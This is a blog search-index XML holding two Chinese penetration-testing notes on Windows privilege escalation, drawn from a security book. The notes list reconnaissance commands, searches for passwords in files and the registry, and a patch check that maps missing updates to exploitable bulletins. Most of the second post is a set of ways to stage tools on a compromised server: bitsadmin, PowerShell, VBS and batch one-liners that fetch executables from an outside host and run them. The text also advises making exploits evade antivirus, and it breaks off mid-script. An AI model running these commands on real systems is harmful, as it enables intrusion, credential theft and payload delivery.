<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Windows提权信息收集思路与命令汇总</title>
    <link href="/2021/03/23/Windows%E6%8F%90%E6%9D%83%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E4%B8%8E%E5%91%BD%E4%BB%A4%E6%B1%87%E6%80%BB/"/>
    <url>/2021/03/23/Windows%E6%8F%90%E6%9D%83%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E4%B8%8E%E5%91%BD%E4%BB%A4%E6%B1%87%E6%80%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="提权信息收集思路与常用命令汇总"><a href="#提权信息收集思路与常用命令汇总" class="headerlink" title="提权信息收集思路与常用命令汇总"></a>提权信息收集思路与常用命令汇总</h1><h2 id="0x01-Windows-提权信息收集思路与简单命令"><a href="#0x01-Windows-提权信息收集思路与简单命令" class="headerlink" title="0x01 Windows 提权信息收集思路与简单命令"></a>0x01 Windows 提权信息收集思路与简单命令</h2><h3 id="1．操作系统的名称和版本信息"><a href="#1．操作系统的名称和版本信息" class="headerlink" title="1．操作系统的名称和版本信息"></a>1．操作系统的名称和版本信息</h3><div class="hljs code-wrapper"><pre><code class="hljs sh">systeminfo | findstr /B /C:<span class="hljs-string">&quot;OS Name&quot;</span> /C:<span class="hljs-string">&quot;OS Version&quot;</span>systeminfo | findstr /B /C:<span class="hljs-string">&quot;OS 名称&quot;</span> /C:<span class="hljs-string">&quot;OS 版本&quot;</span></code></pre></div><h3 id="2．主机名称和所有环境变量"><a href="#2．主机名称和所有环境变量" class="headerlink" title="2．主机名称和所有环境变量"></a>2．主机名称和所有环境变量</h3><ul><li>主机名称：hostname 命令。</li><li>环境变量：SET 命令。</li></ul><h3 id="3．查看用户信息"><a href="#3．查看用户信息" class="headerlink" title="3．查看用户信息"></a>3．查看用户信息</h3><ul><li>查看所有用户：<code>net user</code>或<code>net1 user</code>命令。</li><li>查看管理员用户组：<code>net localgroup administrators</code>或<code>net1 localgroup administrators</code>命令。</li><li>查看远程终端在线用户：<code>query user</code>或<code>quser</code>命令。</li></ul><h3 id="4．查看远程端口"><a href="#4．查看远程端口" class="headerlink" title="4．查看远程端口"></a>4．查看远程端口</h3><p>（1）通过注册表查看RDP端口</p><ul><li>运行<code>REG query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber</code>命令。</li></ul><p>（2）通过命令行查看</p><ul><li>获取对应的 PID 号：<code>tasklist /svc | find &quot;TermService&quot;</code>命令。</li><li>通过 PID 号查找端口：<code>netstat -ano | find &quot;1980&quot;</code>命令。</li></ul><h3 id="5．查看网络情况"><a href="#5．查看网络情况" class="headerlink" title="5．查看网络情况"></a>5．查看网络情况</h3><ul><li><p>网络配置情况：<code>ipconfig /all</code>命令。</p></li><li><p>路由器信息：<code>route print</code>命令。</p></li><li><p>要查看 ARP 缓存：<code>arp –a</code>命令。</p></li><li><p>查看网络连接：<code>netstat –ano</code>命令。</p></li><li><p>查看防火墙规则，命令如下。</p><div class="hljs code-wrapper"><pre><code class="hljs cmd">netsh firewall show confignetsh firewall show state</code></pre></div></li><li><p>hosts文件</p></li></ul><h3 id="6．应用程序和服务"><a href="#6．应用程序和服务" class="headerlink" title="6．应用程序和服务"></a>6．应用程序和服务</h3><ul><li><p>查看服务的进程 ID：<code>tasklist /SVC</code>命令。</p></li><li><p>查看已安装驱动程序的列表：DRIVERQUERY 命令。</p></li><li><p>查看已经启动的 Windows 服务：<code>net start</code>命令。</p></li><li><p>查看某服务的启动权限：<code>sc qc TermService</code>命令。</p></li><li><p>查看已安装程序的列表：<code>wmic product list brief</code>命令。</p></li><li><p>查看服务列表：<code>wmic service list brief</code>命令。</p></li><li><p>查看进程列表：<code>wmic process list brief</code>命令。</p></li><li><p>查看启动程序列表：<code>wmic startup list brief</code>命令</p></li><li><p>查看已安装的更新和安装日期，代码如下：<code>wmic qfe get Caption,De**ion,HotFixID,InstalledOn </code></p><p>搜索可以提升权限的特定漏洞，代码如下</p><p><code>wmic qfe get Caption,De**ion,HotFixID,InstalledOn | findstr /C:&quot;KBxxxxxxx&quot; </code></p><p>如果执行上面的命令后没有输出，意味着那个补丁未安装。</p></li><li><p>结束程序：<code>wmic process where name=&quot;iexplore.exe&quot; call terminate</code>命令。</p></li></ul><h3 id="7．检索敏感文件"><a href="#7．检索敏感文件" class="headerlink" title="7．检索敏感文件"></a>7．检索敏感文件</h3><div class="hljs code-wrapper"><pre><code class="hljs cmd"><span class="hljs-built_in">dir</span> /b /s password.txt<span class="hljs-built_in">dir</span> /b /s *.doc<span class="hljs-built_in">dir</span> /b /s *.ppt<span class="hljs-built_in">dir</span> /b /s *.xls<span class="hljs-built_in">dir</span> /b /s *.docx<span class="hljs-built_in">dir</span> /b /s *.xlsx<span class="hljs-built_in">dir</span> /b /s config.* filesystem<span class="hljs-built_in">findstr</span> /si password *.xml *.ini *.txt<span class="hljs-built_in">findstr</span> /si login *.xml *.ini *.txt</code></pre></div><blockquote><p>除此之外，还可以检查无人值守<strong>安装日志文件</strong>。这些文件通常包含 Base64 编码的密码。在大型企业中，单个系统手动安装是不切实际的，找到这些文件即可获取管理员密码。这些文件的共同位 置如下。</p></blockquote><div class="hljs code-wrapper"><pre><code class="hljs cmd"><span class="hljs-function">C:\<span class="hljs-title">sysprep.inf</span></span><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">sysprep</span>\<span class="hljs-title">sysprep.xml</span></span><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Windows</span>\<span class="hljs-title">Panther</span>\<span class="hljs-title">Unattend</span>\<span class="hljs-title">Unattended.xml</span></span><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Windows</span>\<span class="hljs-title">Panther</span>\<span class="hljs-title">Unattended.xml</span></span></code></pre></div><h3 id="8．目录文件操作"><a href="#8．目录文件操作" class="headerlink" title="8．目录文件操作"></a>8．目录文件操作</h3><ul><li><p>列出 d:\www 下的所有目录，命令如下。</p><p><code>for /d %i in (d:\www\*) do @echo %i  </code></p></li><li><p>把当前路径下文件夹名字只有 1～3 个字母的显示出来，命令如下。</p><p><code>for /d %i in (???) do @echo %i  </code></p></li><li><p>以当前目录为搜索路径，把当前目录及其子目录中的全部 EXE 文件列出，命令如下。</p><p><code>for /r %i in (*.exe) do @echo %i</code></p></li><li><p>以指定目录为搜索路径，把当前目录及其子目录中的所有文件列出，命令如下。</p><p><code>for /r &quot;f:\freehost\hmadesign\web\&quot; %i in (*.*) do @echo %i </code></p></li><li><p>显示 a.txt 中的内容，因为/f 的作用，会读出 a.txt 中的内容，命令如下。</p><p><code>for /f %i in (c:\1.txt) do echo %i </code></p></li></ul><h3 id="9．RAR-打包"><a href="#9．RAR-打包" class="headerlink" title="9．RAR 打包"></a>9．RAR 打包</h3><p><code>rar a -k -r -s -m3 c:\1.rar d:\wwwroot </code></p><h3 id="10．PHP-读文件"><a href="#10．PHP-读文件" class="headerlink" title="10．PHP 读文件"></a>10．PHP 读文件</h3><p><code>c:/php/php.exe &quot;c:/www/admin/1.php&quot; </code></p><h3 id="11．Windows-7-及以上版本下载可以使用的-bitsadmin-和-PowerShell"><a href="#11．Windows-7-及以上版本下载可以使用的-bitsadmin-和-PowerShell" class="headerlink" title="11．Windows 7 及以上版本下载可以使用的 bitsadmin 和 PowerShell"></a>11．Windows 7 及以上版本下载可以使用的 bitsadmin 和 PowerShell</h3><div class="hljs code-wrapper"><pre><code class="hljs reasonml">bitsadmin /transfern http:<span class="hljs-comment">//www.antian365.com/ma.exe d:\ma.exe</span>powershell (<span class="hljs-keyword">new</span>-<span class="hljs-keyword">object</span> System.Net.WebClient).<span class="hljs-constructor">DownloadFile(&#x27; <span class="hljs-params">http</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">www</span>.<span class="hljs-params">antian365</span>.<span class="hljs-params">com</span><span class="hljs-operator">/</span><span class="hljs-params">ma</span>.<span class="hljs-params">exe</span>&#x27;,&#x27;<span class="hljs-params">ma</span>.<span class="hljs-params">exe</span>&#x27;)</span></code></pre></div><h3 id="12．注册表关键字搜索-找password"><a href="#12．注册表关键字搜索-找password" class="headerlink" title="12．注册表关键字搜索(找password)"></a>12．注册表关键字搜索(找password)</h3><p>password 为关键字，可以是 vnc 等敏感关键字，命令如下。</p><div class="hljs code-wrapper"><pre><code class="hljs cmd">reg query HKLM /f password /t REG_SZ /sreg query HKCU /f password /t REG_SZ /s</code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210323125944656.png" alt="image-20210323125944656"></p><h3 id="13．系统权限配置"><a href="#13．系统权限配置" class="headerlink" title="13．系统权限配置"></a>13．系统权限配置</h3><div class="hljs code-wrapper"><pre><code class="hljs cmd"><span class="hljs-built_in">cacls</span> c:\<span class="hljs-built_in">cacls</span> c:\windows\ma.exe //查看 ma.exe 的权限配置</code></pre></div><h3 id="14．自动收集脚本"><a href="#14．自动收集脚本" class="headerlink" title="14．自动收集脚本"></a>14．自动收集脚本</h3><div class="hljs code-wrapper"><pre><code class="hljs cmd"><span class="hljs-keyword">for</span> /f &quot;delims=&quot; <span class="hljs-variable">%%A</span> <span class="hljs-keyword">in</span> (&#x27;<span class="hljs-built_in">dir</span> /s /b <span class="hljs-variable">%WINDIR%</span>\system32\*htable.xsl&#x27;) <span class="hljs-keyword">do</span> <span class="hljs-built_in">set</span> &quot;var=<span class="hljs-variable">%%A</span>&quot;wmic process get CSName,Description,ExecutablePath,ProcessId /<span class="hljs-built_in">format</span>:&quot;<span class="hljs-variable">%var%</span>&quot; &gt;&gt; out.htmlwmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName /<span class="hljs-built_in">format</span>:&quot;<span class="hljs-variable">%var%</span>&quot; &gt;&gt; out.htmlwmic USERACCOUNT list full /<span class="hljs-built_in">format</span>:&quot;<span class="hljs-variable">%var%</span>&quot; &gt;&gt; out.htmlwmic group list full /<span class="hljs-built_in">format</span>:&quot;<span class="hljs-variable">%var%</span>&quot; &gt;&gt; out.htmlwmic nicconfig where IPEnabled=&#x27;true&#x27; get Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress /<span class="hljs-built_in">format</span>:&quot;<span class="hljs-variable">%var%</span>&quot; &gt;&gt; out.htmlwmic volume get <span class="hljs-built_in">Label</span>,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace /<span class="hljs-built_in">format</span>:&quot;<span class="hljs-variable">%var%</span>&quot; &gt;&gt; out.htmlwmic netuse list full /<span class="hljs-built_in">format</span>:&quot;<span class="hljs-variable">%var%</span>&quot; &gt;&gt; out.htmlwmic qfe get Caption,Description,HotFixID,InstalledOn /<span class="hljs-built_in">format</span>:&quot;<span class="hljs-variable">%var%</span>&quot; &gt;&gt; out.htmlwmic startup get Caption,Command,Location,User /<span class="hljs-built_in">format</span>:&quot;<span class="hljs-variable">%var%</span>&quot; &gt;&gt; out.htmlwmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version /<span class="hljs-built_in">format</span>:&quot;<span class="hljs-variable">%var%</span>&quot; &gt;&gt; out.htmlwmic os get name,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,SystemDirectory /<span class="hljs-built_in">format</span>:&quot;<span class="hljs-variable">%var%</span>&quot; &gt;&gt; out.htmlwmic Timezone get DaylightName,Description,StandardName /<span class="hljs-built_in">format</span>:&quot;<span class="hljs-variable">%var%</span>&quot; &gt;&gt; out.html</code></pre></div><h2 id="0x02-好用的工具"><a href="#0x02-好用的工具" class="headerlink" title="0x02 好用的工具"></a>0x02 好用的工具</h2><p>持续更新..</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li>《网络攻防实战研究：漏洞利用与提权》</li><li><a href="https://ixyzero.com/blog/archives/4508.html">WINDOWS系统的信息收集</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>提权</category>
      
      <category>windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>提权</tag>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《网络攻防实战研究：漏洞利用与提权》笔记——提权准备工作</title>
    <link href="/2021/03/15/%E3%80%8A%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E7%A0%94%E7%A9%B6%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8F%90%E6%9D%83%E3%80%8B%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C/"/>
    <url>/2021/03/15/%E3%80%8A%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E7%A0%94%E7%A9%B6%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8F%90%E6%9D%83%E3%80%8B%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>本菜鸡准备研读《网络攻防实战研究：漏洞利用与提权》这本宝典，太感动了，前辈们写的通俗易懂、由浅入深。书中的理论知识很大程度上扩展了我的渗透思路，使我受益颇丰，笔者在此记录书中内容的同时，也记录研读时的不懂之处，查阅多方资料，对要点进行补充。人菜就要多读书~~。</p><blockquote><p>提权是整个黑客攻防过程中  难的一个环节。对渗透来说，获取的权限越高，控制的服务器权限越多，也就越有成就感。在整个渗透流程中，提权过程汇聚了思路、技巧、工具和技术。高楼大厦总是需要坚实的地基，在渗透过程中，基础越扎实，就越容易取得   终的胜利。</p><p>——《网络攻防实战研究：漏洞利用与提权》</p></blockquote><h1 id="0x02-提权准备工作"><a href="#0x02-提权准备工作" class="headerlink" title="0x02 提权准备工作"></a>0x02 提权准备工作</h1><h2 id="1-对目标服务器进行信息收集"><a href="#1-对目标服务器进行信息收集" class="headerlink" title="1. 对目标服务器进行信息收集"></a>1. 对目标服务器进行信息收集</h2><blockquote><p>（1）目标服务器信息的收集利用已有权限或者条件，对需要提权的目标服务器进行信息收集，例如在有 WebShell 等的情况</p></blockquote><p>下执行命令获取 Windows 操作系统的信息。 </p><ul><li><p>systeminfo：获取操作系统类型、版本、位数等信息。</p></li><li><p>ipconfig /all：获取是否为独立 IP 地址、DNS、计算机名称等信息。</p></li><li><p>net user：当前用户信息。</p></li><li><p>whoami：当前用户权限。</p></li><li><p>netstat-an：当前端口开放情况。收集系统信息的一个脚本程序如下。</p></li></ul><p>收集系统信息的一个脚本程序如下</p><div class="hljs code-wrapper"><pre><code class="hljs bat">@<span class="hljs-built_in">echo</span> off <span class="hljs-built_in">echo</span> #########system info collection systeminfo <span class="hljs-built_in">ver</span> hostname <span class="hljs-built_in">net</span> user <span class="hljs-built_in">net</span> localgroup <span class="hljs-built_in">net</span> localgroup administrators <span class="hljs-built_in">net</span> user guest <span class="hljs-built_in">net</span> user administrator <span class="hljs-built_in">echo</span> #######<span class="hljs-built_in">at</span>- with atq##### <span class="hljs-built_in">echo</span> schtask /query <span class="hljs-built_in">echo</span> <span class="hljs-built_in">echo</span> ####task-list############# tasklist /svc <span class="hljs-built_in">echo</span> <span class="hljs-built_in">echo</span> ####<span class="hljs-built_in">net</span>-work infomation <span class="hljs-built_in">ipconfig</span>/all route <span class="hljs-built_in">print</span> arp -a netstat -anipconfig /displaydns <span class="hljs-built_in">echo</span> <span class="hljs-built_in">echo</span> #######service############ sc query <span class="hljs-built_in">type</span>= service state= all <span class="hljs-built_in">echo</span> #######file-############## <span class="hljs-built_in">cd</span> \ <span class="hljs-built_in">tree</span> –F</code></pre></div><h2 id="2-收集目标服务器漏洞补丁情况"><a href="#2-收集目标服务器漏洞补丁情况" class="headerlink" title="2. 收集目标服务器漏洞补丁情况"></a>2. 收集目标服务器漏洞补丁情况</h2><blockquote><p>（2）准备提权服务器的漏洞补丁情况收集</p></blockquote><div class="hljs code-wrapper"><pre><code class="hljs bat">systeminfo&gt;C:\Windows\Temp\temp.txt&amp;(<span class="hljs-keyword">for</span> %i <span class="hljs-keyword">in</span> (KB977165 KB970483 KB3057191 KB3079904 KB3077657 KB3045171 KB2840221 KB3000061 KB2850851 KB2707511 KB2711167 KB2124261 KB2360937 KB2478960 KB2507938 KB2566454 KB2646524 KB2645640 KB2641653 KB944653 KB952004 KB971657 KB2620712 KB2393802 KB942831 KB2503665 KB2592799 KB956572 KB977165 KB2621440 KB3124280 KB3143141 KB3134228) <span class="hljs-keyword">do</span> @<span class="hljs-built_in">type</span> C:\Windows\Temp\ temp.txt|@<span class="hljs-built_in">find</span> /i &quot;%i&quot;|| @<span class="hljs-built_in">echo</span> %i <span class="hljs-keyword">Not</span> Installed!)&amp;<span class="hljs-built_in">del</span> /f /q /a C:\Windows\Temp\temp.txt</code></pre></div><p>补丁号对应的可供利用的程序名称列举如下。</p><ul><li> KB2360937：MS10-084。  </li><li> KB2478960：MS11-014。</li><li> KB2507938：MS11-056。 </li><li> KB2566454：MS11-062。  </li><li> KB2646524：MS12-003。</li><li> KB2645640：MS12-009。 </li><li> KB2641653：MS12-018。 </li><li> KB944653：MS07-067。 </li><li> KB952004：MS09-012 PR。 </li><li> KB971657：MS09-041。 </li><li> KB2620712：MS11-097。  </li><li> KB2393802：MS11-011。 </li><li> KB942831：MS08-005。</li><li> KB2503665：MS11-046。 </li><li> KB2592799：MS11-080。 </li><li> KB956572：MS09-012 烤肉。 </li><li> KB2621440：MS12-020。 </li><li> KB977165：MS10-015 Ms Viru。</li><li> KB3124280：MS16-032。 </li><li> KB3143141：MS16-016。 </li><li> KB3134228：MS16-014。 </li><li> KB3079904：MS15-097。 </li><li> KB3077657：MS15-077。 </li><li> KB3045171：MS15-051。 </li><li> KB3000061：MS14-058。 </li><li> KB2829361：MS13-046。 </li><li> KB2850851：MS13-053 EPATHOBJ 0day（限 32 位）。</li><li> KB2707511：MS12-042 sysret –pid。</li><li> KB2124261 和 KB2271195：MS10-065 IIS7。</li><li> KB970483：MS09-020 IIS6。</li></ul><h2 id="3-准备提权-0day-及其他相关工具"><a href="#3-准备提权-0day-及其他相关工具" class="headerlink" title="3. 准备提权 0day 及其他相关工具"></a>3. 准备提权 0day 及其他相关工具</h2><blockquote><p>针对当前操作系统准备 32 位或 64 位提权 0day。针对当前操作系统应用程序准备提权 0day。准 备获取密码的 Hash 工具，并对 0day 及其相关工具进行免杀处理和测试。</p></blockquote><h2 id="4-寻找服务器可写目录"><a href="#4-寻找服务器可写目录" class="headerlink" title="4. 寻找服务器可写目录"></a>4. 寻找服务器可写目录</h2><p>在目标服务器中找到一个可写目录。</p><h1 id="0x03-实施提权"><a href="#0x03-实施提权" class="headerlink" title="0x03 实施提权"></a>0x03 实施提权</h1><h2 id="1-上传或者下载提权-0day-和相关工具"><a href="#1-上传或者下载提权-0day-和相关工具" class="headerlink" title="1. 上传或者下载提权 0day 和相关工具"></a>1. 上传或者下载提权 0day 和相关工具</h2><blockquote><p>将文件上传到服务器有多种方式，例如通过 WebShell、FTP、下载命令等将工具上传到系统的 可写目录下。一些可供参考的下载方法如下。</p></blockquote><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><h4 id="使用-vbs-下载"><a href="#使用-vbs-下载" class="headerlink" title="使用 vbs 下载"></a>使用 vbs 下载</h4><div class="hljs code-wrapper"><pre><code class="hljs vbscript">iLocal = <span class="hljs-built_in">LCase</span>(WScript.Arguments(<span class="hljs-number">1</span>)) iRemote = <span class="hljs-built_in">LCase</span>(WScript.Arguments(<span class="hljs-number">0</span>)) <span class="hljs-keyword">Set</span> xPost = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Microsoft.XMLHTTP&quot;</span>) xPost.Open <span class="hljs-string">&quot;GET&quot;</span>,iRemote,<span class="hljs-number">0</span> xPost.Send() <span class="hljs-keyword">Set</span> sGet = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;ADODB.Stream&quot;</span>) sGet.Mode = <span class="hljs-number">3</span> sGet.Type = <span class="hljs-number">1</span> sGet.Open() sGet.Write(xPost.responseBody) sGet.SaveToFile iLocal,<span class="hljs-number">2</span></code></pre></div><p>使用命令“cscript down.vbs <a href="http://www.antian365.com/ma.exe">http://www.antian365.com/ma.exe</a> c:/ma.exe”，将 ma.exe 保存到 C 盘 根目录下，不写路径则会显示程序执行出错。</p><p>固定下载程序位置和名称并下载，代码如下。</p><div class="hljs code-wrapper"><pre><code class="hljs vbscript">url = <span class="hljs-string">&quot;http:// www.antian365.com /ma.exe&quot;</span> <span class="hljs-comment">&#x27;网络上的文件地址</span>saveas = <span class="hljs-string">&quot;c:\ma.exe&quot;</span> <span class="hljs-comment">&#x27;保存的本地文件</span><span class="hljs-keyword">Set</span> xmlhttp = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Microsoft.XMLHTTP&quot;</span>) <span class="hljs-comment">&#x27;创建 HTTP 请求对象</span><span class="hljs-keyword">Set</span> stream = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;ADODB.Stream&quot;</span>) <span class="hljs-comment">&#x27;创建 ADO 数据流对象</span><span class="hljs-keyword">Call</span> xmlhttp.open(<span class="hljs-string">&quot;GET&quot;</span>,url,<span class="hljs-literal">False</span>) <span class="hljs-comment">&#x27;打开连接</span><span class="hljs-keyword">Call</span> xmlhttp.send() <span class="hljs-comment">&#x27;发送请求</span>stream.mode = <span class="hljs-number">3</span> <span class="hljs-comment">&#x27;设置数据流为读写模式</span>stream.type = <span class="hljs-number">1</span> <span class="hljs-comment">&#x27;设置数据流为二进制模式</span><span class="hljs-keyword">Call</span> stream.open() <span class="hljs-comment">&#x27;打开数据流</span><span class="hljs-keyword">Call</span> stream.write(xmlhttp.responsebody) <span class="hljs-comment">&#x27;将服务器的返回报文主体内容写入数据流</span><span class="hljs-keyword">Call</span> stream.savetofile(saveas,<span class="hljs-number">2</span>) <span class="hljs-comment">&#x27;将数据流保存为文件</span><span class="hljs-keyword">Set</span> xmlhttp = <span class="hljs-literal">Nothing</span> <span class="hljs-keyword">Set</span> stream = <span class="hljs-literal">Nothing</span></code></pre></div><p>将以上代码保存为 down.vbs 文件，执行“cscript down.vbs”命令即可下载程序 ma.exe 到 C 盘中。</p><p>另外一种下载文件的方法，代码如下。</p><div class="hljs code-wrapper"><pre><code class="hljs vbscript"><span class="hljs-keyword">Set</span> xPost = <span class="hljs-built_in">createObject</span>(<span class="hljs-string">&quot;Microsoft.XMLHTTP&quot;</span>) xPost.Open <span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot; http:// www.antian365.com /ma.exe &quot;</span>,<span class="hljs-number">0</span> <span class="hljs-comment">&#x27;下载文件的地址</span>xPost.Send() <span class="hljs-keyword">Set</span> sGet = <span class="hljs-built_in">createObject</span>(<span class="hljs-string">&quot;ADODB.Stream&quot;</span>) sGet.Mode = <span class="hljs-number">3</span> sGet.Type = <span class="hljs-number">1</span> sGet.Open() sGet.Write(xPost.responseBody) sGet.SaveToFile <span class="hljs-string">&quot;c:\2.exe&quot;</span>,<span class="hljs-number">2</span> <span class="hljs-comment">&#x27;保存文件的路径和文件名</span></code></pre></div><h4 id="使用-powershell-下载"><a href="#使用-powershell-下载" class="headerlink" title="使用 powershell 下载"></a>使用 powershell 下载</h4><p>下载并执行:</p><div class="hljs code-wrapper"><pre><code class="hljs powershell">powershell (<span class="hljs-built_in">new-object</span> System.Net.WebClient).DownloadFile(<span class="hljs-string">&#x27;http://1.2.3.4/5.exe&#x27;</span>,<span class="hljs-string">&#x27;c:\download\a.exe&#x27;</span>);<span class="hljs-built_in">start-process</span> <span class="hljs-string">&#x27;c:\download\a.exe&#x27;</span></code></pre></div><h4 id="Perl文件下载"><a href="#Perl文件下载" class="headerlink" title="Perl文件下载"></a>Perl文件下载</h4><p>Perl是一种用途非常广泛的脚本语言，几乎可以用于任何东西。使用Perl可以非常轻松地将文件下载到本地主机上。</p><div class="hljs code-wrapper"><pre><code class="hljs perl"><span class="hljs-comment">#!/usr/bin/perl </span><span class="hljs-keyword">use</span> LWP::Simple; getstore(<span class="hljs-string">&quot;http://domain/file&quot;</span>, <span class="hljs-string">&quot;file&quot;</span>);</code></pre></div><p>perl test.pl</p><h4 id="Python文件下载"><a href="#Python文件下载" class="headerlink" title="Python文件下载"></a>Python文件下载</h4><p>Python是一种通用的脚本语言，强调代码的可读性。与大多数脚本语言一样，目标是编写的代码少于编程语言所需的代码，同时仍能完成预期的任务。</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><span class="hljs-keyword">import</span> urllib2 u = urllib2.urlopen(<span class="hljs-string">&#x27;http://domain/file&#x27;</span>) localFile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;local_file&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) localFile.write(u.read()) localFile.close()</code></pre></div><h4 id="Ruby文件下载"><a href="#Ruby文件下载" class="headerlink" title="Ruby文件下载"></a>Ruby文件下载</h4><p>Ruby是一种面向对象的编程语言，可用于许多事情，从创建框架（例如Metasploit）到简单的任务（例如下载文件）。</p><div class="hljs code-wrapper"><pre><code class="hljs ruby"><span class="hljs-meta">#!/usr/bin/ruby</span><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;net/http&#x27;</span> Net::HTTP.start(<span class="hljs-string">&quot;www.domain.com&quot;</span>) &#123;     <span class="hljs-params">|http|</span> r = http.get(<span class="hljs-string">&quot;/file&quot;</span>)     open(<span class="hljs-string">&quot;save_location&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) &#123;         <span class="hljs-params">|file|</span> file.write(r.body)         &#125;     &#125;</code></pre></div><p>ruby test.rb</p><h4 id="PHP文件下载"><a href="#PHP文件下载" class="headerlink" title="PHP文件下载"></a>PHP文件下载</h4><p>PHP通常是用于Web开发的服务器端脚本语言，但也可以用作通用脚本语言。</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-comment">#!/usr/bin/php </span><span class="hljs-meta">&lt;?php</span>         <span class="hljs-variable">$data</span> = @file(<span class="hljs-string">&quot;http://example.com/file&quot;</span>);         <span class="hljs-variable">$lf</span> = <span class="hljs-string">&quot;local_file&quot;</span>;         <span class="hljs-variable">$fh</span> = fopen(<span class="hljs-variable">$lf</span>, <span class="hljs-string">&#x27;w&#x27;</span>);         fwrite(<span class="hljs-variable">$fh</span>, <span class="hljs-variable">$data</span>[<span class="hljs-number">0</span>]);         fclose(<span class="hljs-variable">$fh</span>); <span class="hljs-meta">?&gt;</span></code></pre></div><p>php test.php</p><h4 id="使用-bitsadmin-命令下载文件"><a href="#使用-bitsadmin-命令下载文件" class="headerlink" title="使用 bitsadmin 命令下载文件"></a>使用 bitsadmin 命令下载文件</h4><p>第一种方式，代码如下。</p><div class="hljs code-wrapper"><pre><code class="hljs cmd">bitsadmin /transfer myjob1 /download /priority normal http://antian365.com/psexec.exe c:\psexec.exe</code></pre></div><p>第二种方式，代码如下。</p><div class="hljs code-wrapper"><pre><code class="hljs cmd">bitsadmin /rawreturn /transfer getfile http://sysinternals.com/files/PSTools.zip c:\p.zip</code></pre></div><p>第三种方式，代码如下。</p><div class="hljs code-wrapper"><pre><code class="hljs cmd">bitsadmin /rawreturn /transfer getpayload http://sysinternals.com/files/PSTools.zip c:\p.zip</code></pre></div><p>第四种方式，代码如下。</p><div class="hljs code-wrapper"><pre><code class="hljs cmd">bitsadmin /transfer myDownLoadJob /download /priority normal &quot;http://download.sysinternals.com/files/PSTools.zip&quot; &quot;c:\p.zip&quot;</code></pre></div><h4 id="在-bat-模式下执行-vbs-下载"><a href="#在-bat-模式下执行-vbs-下载" class="headerlink" title="在 bat 模式下执行 vbs 下载"></a>在 bat 模式下执行 vbs 下载</h4><div class="hljs code-wrapper"><pre><code class="hljs bat"><span class="hljs-built_in">echo</span> <span class="hljs-built_in">Set</span> xPost = CreateObject(&quot;Microsoft.XMLHTTP&quot;) &gt;<span class="hljs-number">1</span>.vbs <span class="hljs-built_in">echo</span> xPost.Open &quot;GET&quot;,&quot;http://<span class="hljs-number">58</span>.<span class="hljs-number">54</span>.<span class="hljs-number">99</span>.<span class="hljs-number">22</span>:<span class="hljs-number">8080</span>/<span class="hljs-built_in">help</span>.exe&quot;,<span class="hljs-number">0</span> &gt;&gt;<span class="hljs-number">1</span>.vbs <span class="hljs-built_in">echo</span> xPost.Send() &gt;&gt;<span class="hljs-number">1</span>.vbs <span class="hljs-built_in">echo</span> <span class="hljs-built_in">Set</span> sGet = CreateObject(&quot;ADODB.Stream&quot;) &gt;&gt;<span class="hljs-number">1</span>.vbs <span class="hljs-built_in">echo</span> sGet.<span class="hljs-built_in">Mode</span> = <span class="hljs-number">3</span> &gt;&gt;<span class="hljs-number">1</span>.vbs <span class="hljs-built_in">echo</span> sGet.<span class="hljs-built_in">Type</span> = <span class="hljs-number">1</span> &gt;&gt;<span class="hljs-number">1</span>.vbs <span class="hljs-built_in">echo</span> sGet.Open() &gt;&gt;<span class="hljs-number">1</span>.vbs <span class="hljs-built_in">echo</span> sGet.Write(xPost.responseBody) 